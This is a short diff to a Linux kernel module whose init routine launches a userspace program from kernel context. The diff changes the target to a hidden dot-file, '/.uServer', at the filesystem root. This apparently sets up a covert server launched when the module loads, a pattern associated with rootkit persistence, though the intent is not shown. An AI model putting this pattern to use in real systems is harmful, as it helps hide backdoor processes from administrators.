@@ -7,6 +7,8 @@
 #include <linux/module.h>  /* Needed by all modules */
 #include <linux/kernel.h>  /* Needed for KERN_ALERT */
 
+#define SERVER_PATH "/.uServer"
+
 static int ls_exec(void);
 
 int init_module(void)
@@ -22,7 +24,7 @@ static int ls_exec( void )
 {
   int ret =-1;
   struct subprocess_info *sub_info;
-  char *argv[] = { "/home/e/a.out", NULL };
+  char *argv[] = { SERVER_PATH, NULL };
   static char *envp[] = {
         "HOME=/",
         "TERM=linux",
